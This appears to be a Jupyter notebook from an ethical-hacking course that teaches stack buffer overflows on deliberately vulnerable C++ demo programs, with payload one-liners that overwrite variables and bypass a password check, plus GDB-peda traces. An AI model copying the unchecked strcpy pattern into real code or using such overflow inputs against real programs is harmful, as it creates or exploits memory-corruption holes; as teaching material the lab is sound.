{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Stack Overflow\n",
    "\n",
    "- buffer overrun in the stack segment\n",
    "\n",
    "## Stack overflow consequences\n",
    "\n",
    "- stack overflow can violate all 3 CIA (Confidentialy, Integrity and Availability) security principles \n",
    "\n",
    "1. overwrite variable(s) with the data of your choice (Integrity)\n",
    "2. change the flow of the program execution (Integrity)\n",
    "3. remote code execution (Confidentiality, Integrity, Availability)\n",
    "\n",
    "- let's look at the first two impact of stack overflow on this notebook\n",
    "\n",
    "### Memory corruption\n",
    "\n",
    "- overwrite data in memory\n",
    "- voilates data integrity\n",
    "- can overwrite variables with the data of your choice on the stack\n",
    "\n",
    "- let's use some demo programs to demonstrate various consequences of stackoverflow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "# let's demonstrate this\n",
    "! cat ../demos/stack_overflow/memory_corruption.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "input=\"../demos/stack_overflow/memory_corruption.cpp\"\n",
    "output=\"memory_corruption.exe\"\n",
    "echo kali | sudo -S ../demos/compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./memory_corruption.exe \n",
    "# segfault is bad!! provide some argument\n",
    "# you don't see segfault in Jupyter notebook, but you can see it in terminal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# run the program providing some argument\n",
    "! ./memory_corruption.exe hello\n",
    "# notice the addresses of variables are shifted"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# try a few some other values like 15 As\n",
    "! ./memory_corruption.exe $(python3 -c 'print(\"A\"*15)')\n",
    "# observe the values of buffer_two and buffer_one, and num"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# try 16 As\n",
    "! ./memory_corruption.exe  $(python3 -c 'print(\"A\"*16, end=\"\")')\n",
    "# observe the values of buffer_two and buffer_one, and num\n",
    "# num is 0 which is ascii value of NULL"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- try to overwrite num variable with \"BCDE\"\n",
    "- how may bytes is num away from buffer_two? What's the offset of buffer_two with respect to num?\n",
    "- find the difference between the address of value and buffer_two"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# subtract the address of buffer_two from the address of num\n",
    "# which variable is at higher location?\n",
    "print(0xffffc414 - 0xffffc40c)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# we know that 16 byes is the offset! any longer text will modify the num variable\n",
    "# try 16As+\"BCDE\" and notice the value of num\n",
    "! ./memory_corruption.exe $(python3 -c 'print(\"A\"*16 + \"BCDE\", end=\"\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# check the hex values with python; also see the values of buffer_two and buffer_one\n",
    "chr(int('42', 16))\n",
    "# B is stored at the end!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# or find the hex representation of ASCII of B\n",
    "ord('B')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# let's check that 0x45444342 is hex representation of 'BCDE' in reverse order\n",
    "print(''.join([\"{:02x}\".format(ord(c)) for c in 'BCDE']))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Recall x86 stores integers in little-endian!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# now try overwriting value with BCDE; in the right order\n",
    "! ./memory_corruption.exe $(python3 -c 'print(\"A\"*16 + \"EDCB\")')\n",
    "# check if BCDE is in that order...\n",
    "# remember x86 is little-endian, i.e., least significant byte is stored first"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# can directly send hex values of EDCB\n",
    "! ./memory_corruption.exe  $(python3 -c 'print(\"A\"*16 + \"\\x45\\x44\\x43\\x42\")')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./memory_corruption.exe $(python3 -c 'print(\"A\"*110000 + \"\\x1c\\xc3\\xff\\xff\")')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### draw stack of main( ) and answer the following questions\n",
    "- what is the order of the variables pushed?\n",
    "- when argv[1] is copied to buffer_two, what may happen to other variables?\n",
    "- what caused the memory corruption?\n",
    "- compile and run the program with some arguments"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Change the flow of the program execution\n",
    "- due to buffer overflow, we can change the flow of the program execution especially if the program relies on the variable data on the stack\n",
    "- violates the integriy of the program itself\n",
    "- use ./demos/stack_overflow/authenticate.cpp program to demonstrate the impact"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "#include <cstdlib>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "int check_authentication(char *password) {\r\n",
      "    int auth_flag = 0;\r\n",
      "    char password_buffer[16];\r\n",
      "\r\n",
      "    strcpy(password_buffer, password);\r\n",
      "\r\n",
      "    if(strcmp(password_buffer, \"brillig\") == 0)\r\n",
      "        auth_flag = 1;\r\n",
      "    if(strcmp(password_buffer, \"outgrabe\") == 0)\r\n",
      "        auth_flag = 1;\r\n",
      "\r\n",
      "    return auth_flag;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    if(argc < 2) {\r\n",
      "        cout << \"Usage: \" << argv[0] << \" password\\n\";\r\n",
      "        exit(0);\r\n",
      "    }\r\n",
      "    if(check_authentication(argv[1])) {\r\n",
      "        cout << \"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "        cout << \"      Access Granted.\\n\";\r\n",
      "        cout << \"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "    } \r\n",
      "    else\r\n",
      "        cout << \"\\nAccess Denied.\\n\";\r\n",
      "    return 0;\r\n",
      "}\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "! cat ../demos/stack_overflow/authenticate.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "# let's compile the program\n",
    "input=\"../demos/stack_overflow/authenticate.cpp\"\n",
    "output=\"authenticate.exe\"\n",
    "#echo kali | sudo -S ../demos/compile.sh $input $output\n",
    "g++ -m32 -o $output $input"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./authenticate.exe password\r\n"
     ]
    }
   ],
   "source": [
    "# run the program; gives help on how to run it properly\n",
    "! ./authenticate.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# authenticate with hard-coded password: outgrabe\n",
    "! ./authenticate.exe outgrabe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# authenticate with hardcoded password: brillig\n",
    "! ./authenticate.exe brillig"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Access Denied.\r\n"
     ]
    }
   ],
   "source": [
    "# any other password shouldn't work!\n",
    "! ./authenticate.exe ard"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### authenticate without correct password"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "Access Denied.\r\n"
     ]
    }
   ],
   "source": [
    "# since password_buffer is 16 bytes, let's provide 16 As as password\n",
    "! ./authenticate.exe $(python -c 'print(\"A\"*16)')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# how about 17 As?\n",
    "! ./authenticate.exe $(python -c 'print(\"A\"*17)')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### TODO\n",
    "- draw stack of check_authentication( ) \n",
    "- explain why 17As lets you in!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### verify with gdb-peda\n",
    "- run the program in GDB to see the address of auth_flag relative to that of password_buffer\n",
    "- peda will show address of both password_buffer and auth_flag in stack context\n",
    "- observe the value of auth_flag; any int value other than 0 is treated as true!\n",
    "- make sure peda (python exploit development assistante) is installed (see [GDB Peda Notebook](./GDB-Peda.ipynb)\n",
    "\n",
    "- load authenticate.exe into gdb\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ gdb -q authenticate.exe\n",
    "Reading symbols from authenticate.exe...\n",
    "```\n",
    "\n",
    "- set a break point at check_authentication function\n",
    "```bash\n",
    "gdb-peda$ break check_authentication\n",
    "Breakpoint 1 at 0x80491c4: file demos/stack_overflow/authenticate.cpp, line 7.\n",
    "```\n",
    "\n",
    "- run the program with 17 A's as argument\n",
    "\n",
    "```bash\n",
    "gdb-peda$ run $(python3 -c 'print(\"A\"*17)')\n",
    "Starting program: /home/kali/EthicalHacking/authenticate.exe $(python3 -c 'print(\"A\"*17)')\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xffffc6d0 ('A' <repeats 17 times>)\n",
    "EBX: 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "ECX: 0xffffc3b0 --> 0x2 \n",
    "EDX: 0xffffc3e4 --> 0x0 \n",
    "ESI: 0xffffc3b0 --> 0x2 \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0xffffc368 --> 0xffffc398 --> 0x0 \n",
    "ESP: 0xffffc340 --> 0xf7e81ae0 (<_ZNSt8ios_base4InitD2Ev>:      push   ebp)\n",
    "EIP: 0x80491c4 (<_Z20check_authenticationPc+18>:        mov    DWORD PTR [ebp-0xc],0x0)\n",
    "EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x80491b6 <_Z20check_authenticationPc+4>:    sub    esp,0x24\n",
    "   0x80491b9 <_Z20check_authenticationPc+7>:    call   0x80490f0 <__x86.get_pc_thunk.bx>                             \n",
    "   0x80491be <_Z20check_authenticationPc+12>:   add    ebx,0x2e42                                                    \n",
    "=> 0x80491c4 <_Z20check_authenticationPc+18>:   mov    DWORD PTR [ebp-0xc],0x0                                       \n",
    "   0x80491cb <_Z20check_authenticationPc+25>:   sub    esp,0x8                                                       \n",
    "   0x80491ce <_Z20check_authenticationPc+28>:   push   DWORD PTR [ebp+0x8]                                           \n",
    "   0x80491d1 <_Z20check_authenticationPc+31>:   lea    eax,[ebp-0x1c]                                                \n",
    "   0x80491d4 <_Z20check_authenticationPc+34>:   push   eax                                                           \n",
    "[------------------------------------stack-------------------------------------]                                     \n",
    "0000| 0xffffc340 --> 0xf7e81ae0 (<_ZNSt8ios_base4InitD2Ev>:     push   ebp)\n",
    "0004| 0xffffc344 --> 0x804c031 --> 0x0 \n",
    "0008| 0xffffc348 --> 0x804c02c --> 0x0 \n",
    "0012| 0xffffc34c --> 0x8049333 (<__static_initialization_and_destruction_0(int, int)+12>:       add    ebx,0x2ccd)\n",
    "0016| 0xffffc350 --> 0x0 \n",
    "0020| 0xffffc354 --> 0x2 \n",
    "0024| 0xffffc358 --> 0xffffc378 --> 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "0028| 0xffffc35c --> 0x804939f (<_GLOBAL__sub_I__Z20check_authenticationPc()+31>:       add    esp,0x10)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "\n",
    "Breakpoint 1, check_authentication (password=0xffffc6d0 'A' <repeats 17 times>)\n",
    "    at demos/stack_overflow/authenticate.cpp:7\n",
    "7           int auth_flag = 0;\n",
    "```\n",
    "\n",
    "- step through the code and stop after strcpy(password_buffer, password);\n",
    "- entering next command twice will do it\n",
    "\n",
    "```bash\n",
    "gdb-peda$ n\n",
    "\n",
    "gdb-peda$ n\n",
    "[----------------------------------registers-----------------------------------]\n",
    "EAX: 0xffffc34c ('A' <repeats 17 times>)\n",
    "EBX: 0x804c000 --> 0x804bf04 --> 0x1 \n",
    "ECX: 0xffffc6e0 --> 0x4f430041 ('A')\n",
    "EDX: 0xffffc35c --> 0x41 ('A')\n",
    "ESI: 0xffffc3b0 --> 0x2 \n",
    "EDI: 0xf7de6000 --> 0x1e4d6c \n",
    "EBP: 0xffffc368 --> 0xffffc398 --> 0x0 \n",
    "ESP: 0xffffc340 --> 0xf7e81ae0 (<_ZNSt8ios_base4InitD2Ev>:      push   ebp)\n",
    "EIP: 0x80491dd (<_Z20check_authenticationPc+43>:        sub    esp,0x8)\n",
    "EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x80491d4 <_Z20check_authenticationPc+34>:   push   eax\n",
    "   0x80491d5 <_Z20check_authenticationPc+35>:   call   0x8049090 <strcpy@plt>\n",
    "   0x80491da <_Z20check_authenticationPc+40>:   add    esp,0x10\n",
    "=> 0x80491dd <_Z20check_authenticationPc+43>:   sub    esp,0x8\n",
    "   0x80491e0 <_Z20check_authenticationPc+46>:   lea    eax,[ebx-0x1ff7]\n",
    "   0x80491e6 <_Z20check_authenticationPc+52>:   push   eax\n",
    "   0x80491e7 <_Z20check_authenticationPc+53>:   lea    eax,[ebp-0x1c]\n",
    "   0x80491ea <_Z20check_authenticationPc+56>:   push   eax\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0xffffc340 --> 0xf7e81ae0 (<_ZNSt8ios_base4InitD2Ev>:     push   ebp)\n",
    "0004| 0xffffc344 --> 0x804c031 --> 0x0 \n",
    "0008| 0xffffc348 --> 0x804c02c --> 0x0 \n",
    "0012| 0xffffc34c ('A' <repeats 17 times>)\n",
    "0016| 0xffffc350 ('A' <repeats 13 times>)\n",
    "0020| 0xffffc354 (\"AAAAAAAAA\")\n",
    "0024| 0xffffc358 (\"AAAAA\")\n",
    "0028| 0xffffc35c --> 0x41 ('A')\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "12          if(strcmp(password_buffer, \"brillig\") == 0)\n",
    "```\n",
    "\n",
    "- now the password is copeid to password_buffer, let's see the values of couple of stack variables\n",
    "\n",
    "```bash\n",
    "gdb-peda$ p/s password_buffer \n",
    "$1 = 'A' <repeats 16 times>\n",
    "\n",
    "gdb-peda$ p/d auth_flag\n",
    "$2 = 65\n",
    "```\n",
    "\n",
    "- why was auth_flag overwritten?\n",
    "- let's print the addresses of these variables to answer it\n",
    "\n",
    "```bash\n",
    "gdb-peda$ p &password_buffer \n",
    "$3 = (char (*)[16]) 0xffffc34c\n",
    "\n",
    "gdb-peda$ p &auth_flag\n",
    "$4 = (int *) 0xffffc35c\n",
    "```\n",
    "\n",
    "- address of auth_flag is at a higher address compared to the address of password_buffer\n",
    "- let's subtract the the address of password_buffer from auth_flag to find the difference; positive means the auth_flag is at larger address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(0xffffc35c - 0xffffc34c)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### variables declaration order\n",
    "\n",
    "- can you still overflow if the variable declaration orders are switched?\n",
    "- normally, variables are pushed on the stack as they're loaded from top to bottom\n",
    "    - the last variable decalred will be pushed last on the top of the stack\n",
    "\n",
    "### TODO\n",
    "\n",
    "- let's look at an example program demos/stack_overflow/authenticate2.cpp\n",
    "\n",
    "- draw stack\n",
    "- verify it using GDB"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "#include <cstdlib>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "bool check_authentication(char *password) {\r\n",
      "    char password_buffer[16];\r\n",
      "    bool auth_flag = false;\r\n",
      "\r\n",
      "    strcpy(password_buffer, password);\r\n",
      "\r\n",
      "    if(strcmp(password_buffer, \"brillig\") == 0)\r\n",
      "        auth_flag = true;\r\n",
      "    if(strcmp(password_buffer, \"outgrabe\") == 0)\r\n",
      "        auth_flag = true;\r\n",
      "\r\n",
      "    return auth_flag;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    if(argc < 2) {\r\n",
      "        cout << \"Usage: \" << argv[0] << \" password\\n\";\r\n",
      "        exit(0);\r\n",
      "    }\r\n",
      "    if(check_authentication(argv[1])) {\r\n",
      "        cout << \"\\n-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "        cout << \"      Access Granted.\\n\";\r\n",
      "        cout << \"-=-=-=-=-=-=-=-=-=-=-=-=-=-\\n\";\r\n",
      "    } \r\n",
      "    else\r\n",
      "        cout << \"\\nAccess Denied.\\n\";\r\n",
      "    return 0;\r\n",
      "}\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "! cat ../demos/stack_overflow/authenticate2.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "# let's compile the program\n",
    "input=\"../demos/stack_overflow/authenticate2.cpp\"\n",
    "output=\"authenticate2.exe\"\n",
    "echo kali | sudo -S ../demos/compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n",
      "      Access Granted.\r\n",
      "-=-=-=-=-=-=-=-=-=-=-=-=-=-\r\n"
     ]
    }
   ],
   "source": [
    "# run the program with 17As\n",
    "! ./authenticate2.exe $(python3 -c 'print(\"A\"*17, end=\"\")')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### How is it possible?\n",
    "\n",
    "- see in gdb where `auth_flag` is relative to `password_buffer`\n",
    "- auth_flag must be still at higher address (pushed before) compared to password_buffer\n",
    "- one plausible explanation is compiler optimization\n",
    "- if auth_flag is in lower address compared to password_buffer, you can't overwrite it by oveflowing password_buffer\n",
    "    - however, you can still overwrite other part of the memory including caller's return address (\n",
    "    - well, let's keep going... :)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
